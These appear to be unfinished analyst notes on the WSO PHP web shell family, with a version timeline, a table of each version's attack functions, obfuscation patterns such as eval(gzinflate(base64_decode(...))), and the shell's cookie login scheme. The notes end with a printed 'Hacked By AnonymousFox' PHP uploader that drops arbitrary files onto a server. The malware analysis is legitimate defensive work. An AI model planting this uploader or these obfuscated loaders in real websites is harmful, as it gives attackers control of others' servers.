# WSO Web Shells in depth

https://www.wordfence.com/blog/2017/06/wso-shell/
https://forum.antichat.ru/threads/103155/

## Origin

## Timeline

###

2.1 - 2.5 orderly development by oRb (?)

### Feature and bug fix progression

I know the most primitive versions as "WSO_VERSION" of 2.0,
I can't find a 1.x version.

* 2.0
* 2.1
* 2.2
* 2.3
* 2.4
* 2.5 

## Design

"a" parameter and `call_user_func()`

HTML as PHP strings, output using `echo()` (?) instead of
interweaving blocks of code, blocks of HTML

### "action" functions

The value of the POST parameter named "a" determines a category
of things that WSO can do.
The functions available vary by version.



|WSO version | Functions &rarr;    |        |       |      |      |        |          |      |      |      |    |       |   |   |        |        |       |          |   |           |       |    |        |     |   |         |     |   |   |   |      |        |       |       |          |      |   |     |   |       |    |   |     |     |       |    |     |        |         |   |  |   |   |         |         |     |           |       |     |     |     |
|------------|---------------------|--------|-------|------|------|--------|----------|------|------|------|----|-------|---|---|--------|--------|-------|----------|---|-----------|-------|----|--------|-----|---|---------|-----|---|---|---|------|--------|-------|-------|----------|------|---|-----|---|-------|----|---|-----|-----|-------|----|-----|--------|---------|---|--|---|---|---------|---------|-----|-----------|-------|-----|-----|-----|
||Bruteforce|CgiShell|Console|Deface|Domain|FilesMan|FilesTools|Framer|Infect|Logout|Mass|Network|Php|RC|Readable|SafeMode|SecInfo|SelfRemove|Sql|StringTools|Symlink|Test|ZHposter|about|bf|bypassing|bypss|ce|cgi|cms|config|configsh|cpcrack|domains|etcbaypass|etcnmd|fm|forum|ft|ftpsmtp|home|ipb|jmkey|jmsym|lfiscan|mass|phpbb|phptools|shellfind|si|st|sub|sym|symlinker|symserver|tools|userchecker|vbindex|wpkey|wpsym|zoneh|
|2.0|X||X|||X|X|||X|||X|||X|X|X|X|X|||||||||||||||||||||||||||||||||||||||||
|2.1|X||X|||X|X|||X||X|X|||X|X|X|X|X|||||||||||||||||||||||||||||||||||||||||
|2.2|X||X|||X|X|||X||X|X|X||X|X|X|X|X|||||||||||||||||||||||||||||||||||||||||
|2.3|X||X|||X|X|||X||X|X|X||X|X|X|X|X|||||||||||||||||||||||||||||||||||||||||
|2.4|X||X|||X|X|||X||X|X|X||X|X|X|X|X|||||||||||||||||||||||||||||||||||||||||
|2.5|X||X|||X|X|||X||X|X|X|||X|X|X|X|||||||||||||||||||||||||||||||||||||||||
|2.5.1|X||X|||X|X|||X||X|X|X|||X|X|X|X|||||||||||||||||||||||||||||||||||||||||
|2.6|X||X|||X|X|||X||X|X|X||X|X|X|X|X|||||||||||||||||||||||||X|||X|||||||||||||
|2.7|X||X|||X|X|||X||X|X|X||X|X|X|X|X|||||||||||||||||||||||||X|||X|||||||||||||
|2.8|X||X|||X|X|||X||X|X|X|||X|X|X|X|||||||||||||||||||||||||||||||||||||||||
|2.9|X||X|||X|X|||X||X|X|X|||X|X|X|X|||||||||||||||||||||||||||||||||||||||||
|3.0|||X||X|X|X||||X|X||X||X|X|X|X|X|||||||||||||||||||||||||||||||||||||||||
|3.1|X||X|||X|X|X||X||X|X|X||X|X|X|X|X|||||||||||||||||||||||||X|||X|||||||||||||
|4.1.1|X||X|||X|X||X|X||X|X|X||X|X|X|X|X|||||||||||||||||||||||||||||||||||||||||
|4.2.5|X||X|||X|X||X|X||X|X|X||X|X|X|X|X|||||||||||||||||||||||||||||||||||||||||
|Jijle3|X||X||X|X|X|||X||X|X|X||X|X|X|X|X||||X||X|X||X|X|X|X|X|X|X|X||X|X|X|X|X|X|X|X|X|X||X|||X|X|X|X|X|X|X|X|X|X
|bogel|X||X|||X|X|||X||X|X|X||X|X|X|X|X|||||||||||||||||||||||||||||||||||||||||
|WEBAPP|X||X|||X|X|||X||X|X|X|||X|X|X|X|||||||||||||||||||||||||||||||||||||||||

## Methods of obfuscation

Can't be exhaustive - too numerous to list them all.

FOPO
mod_tumblr "plugin"
eval(gzinflate(base64_decode($something)));

## Common URLs? Is this worth it?

### Login Cookie

	name md5($_SERVER['HTTP_HOST'])
	value md5($password)

### actionRC

	-- called 2 ways: w and w/o value for parameter "p1"

### actionPhp

## Vigilante Malware Remover

	-- vigilance committe cookie

## Invocations

	-- all the passwords ever

MD5 hashes of passwords.

eval in password fields:

<?php
echo "Hacked By AnonymousFox\n";
{
$saw1 = $_FILES['file']['tmp_name'];
$saw2 = $_FILES['file']['name'];
echo "<form method='POST' enctype='multipart/form-data'>
<input type='file'name='file' />
<input type='submit' value='upload shell' />
</form>";
move_uploaded_file($saw1,$saw2);
}
?>
